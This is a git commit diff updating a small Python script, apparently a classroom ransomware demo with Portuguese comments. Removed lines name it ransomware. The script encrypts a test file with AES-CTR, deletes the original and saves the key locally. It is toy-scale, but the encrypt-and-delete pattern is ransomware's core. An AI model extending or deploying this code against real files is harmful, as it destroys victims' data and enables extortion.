a0616ad77e32dd4576b4913b67c39a21e4dabd38
Santiago Castrillon <50801625+san2003@users.noreply.github.com>
2025-01-29 19:41:40 -0300

    Update encrypter.py

--- encrypter.py
+++ encrypter.py
@@ -1,24 +1,30 @@
 import os
 import pyaes
+import secrets
 
-## abrir o arquivo a ser criptografado
+# Abrir o arquivo original
 file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+with open(file_name, "rb") as file:
+    file_data = file.read()
 
-## remover o arquivo
-os.remove(file_name)
+# Gerar uma chave de 16 bytes (128 bits) e salvar em um arquivo
+key = secrets.token_bytes(16)
+with open("chave.key", "wb") as key_file:
+    key_file.write(key)
 
-## chave de criptografia
-key = b"testeransomwares"
+# Inicializar AES no modo CTR
 aes = pyaes.AESModeOfOperationCTR(key)
 
-## criptografar o arquivo
+# Criptografar os dados
 crypto_data = aes.encrypt(file_data)
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+# Remover o arquivo original
+os.remove(file_name)
+
+# Criar o arquivo criptografado
+encrypted_file_name = f"{file_name}.enc"
+with open(encrypted_file_name, "wb") as new_file:
+    new_file.write(crypto_data)
+
+print(f"Arquivo criptografado salvo como: {encrypted_file_name}")
+print(f"Chave de descriptografia salva em: chave.key")
